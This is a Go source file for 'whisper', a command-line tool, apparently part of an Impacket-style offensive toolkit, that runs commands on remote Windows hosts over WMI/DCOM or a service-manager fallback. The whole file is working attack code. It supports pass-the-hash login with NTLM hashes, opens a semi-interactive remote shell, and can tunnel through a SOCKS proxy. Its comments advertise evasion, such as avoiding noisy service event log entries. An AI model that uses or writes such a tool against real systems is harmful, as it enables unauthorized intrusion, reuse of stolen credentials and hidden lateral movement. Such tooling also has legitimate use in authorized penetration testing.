// whisper — remote command execution via WMI Win32_Process (or SCM fallback).
// Unlike scorch, commands run as the authenticated user (not SYSTEM) and do
// not create noisy service event log entries when using native WMI mode.
// Use --fallback-scm=false to go via DCOM port 135 when SMB/445 is blocked.
package main

import (
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/go-impacket/kit/internal/cred"
	"github.com/go-impacket/kit/internal/shell"
	"github.com/go-impacket/kit/internal/wmi"
)

func main() {
	target      := flag.String("t", "", "[[domain/]user[:pass]@]host")
	hashes      := flag.String("H", "", "LMHASH:NTHASH")
	share       := flag.String("share", "ADMIN$", "share for output capture (SCM fallback only)")
	noOutput    := flag.Bool("nooutput", false, "skip output retrieval (prints PID)")
	silent      := flag.Bool("silent", false, "skip cmd.exe wrapper (no output)")
	shellType   := flag.String("shell", "cmd", "cmd or powershell")
	port        := flag.Int("port", 445, "SMB port (SCM fallback only)")
	dcIP        := flag.String("dc", "", "domain controller IP")
	timeout     := flag.Duration("timeout", 60*time.Second, "output wait timeout")
	fallbackSCM := flag.Bool("fallback-scm", true, "use SCM technique; false = native DCOM via port 135 (no SMB needed)")
	execCmd     := flag.String("cmd", "", "single command (interactive shell if empty)")
	proxyAddr   := flag.String("proxy", "", "SOCKS5 proxy socks5://host:port — use when proxychains won't hook a static binary")
	flag.Parse()

	_ = dcIP
	_ = silent
	_ = shellType

	if *target == "" {
		flag.Usage()
		os.Exit(1)
	}

	domain, user, pass, host, err := cred.ParseTarget(*target)
	if err != nil {
		fatal("parse target: %v", err)
	}

	bundle := &cred.Bundle{Username: user, Password: pass, Domain: domain, ProxyURL: *proxyAddr}
	if *hashes != "" {
		_, nt, err := cred.FromHashes(*hashes)
		if err != nil {
			fatal("parse hashes: %v", err)
		}
		bundle.NTHash = nt
		bundle.Password = ""
	}

	var exec *wmi.Executor
	if !*fallbackSCM {
		fmt.Fprintf(os.Stderr, "[*] whisper → %s via DCOM (port 135, no SMB required)\n", host)
		exec, err = wmi.ConnectDCOM(host, bundle)
	} else {
		fmt.Fprintf(os.Stderr, "[*] whisper → %s via SCM fallback (SMB port %d)\n", host, *port)
		exec, err = wmi.Connect(host, *port, bundle, *share, *noOutput)
	}
	if err != nil {
		fatal("connect: %v", err)
	}
	defer exec.Close()

	if *execCmd != "" {
		out, _, err := exec.Invoke(*execCmd, *timeout)
		if err != nil {
			fatal("exec: %v", err)
		}
		fmt.Println(strings.TrimRight(out, "\r\n"))
		return
	}

	fmt.Println("[!] whisper — semi-interactive shell")
	prompt := "C:\\>"

	repl := shell.New(prompt, func(line string) (string, bool) {
		line = strings.TrimSpace(line)
		switch strings.ToLower(line) {
		case "exit", "quit":
			return "", true
		case "":
			return "", false
		}

		out, _, err := exec.Invoke(line, *timeout)
		if err != nil {
			return fmt.Sprintf("[!] %v", err), false
		}
		if out == "" {
			return "[i] (empty output)", false
		}
		return strings.TrimRight(out, "\r\n"), false
	})

	repl.Run()
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[-] "+format+"\n", args...)
	os.Exit(1)
}
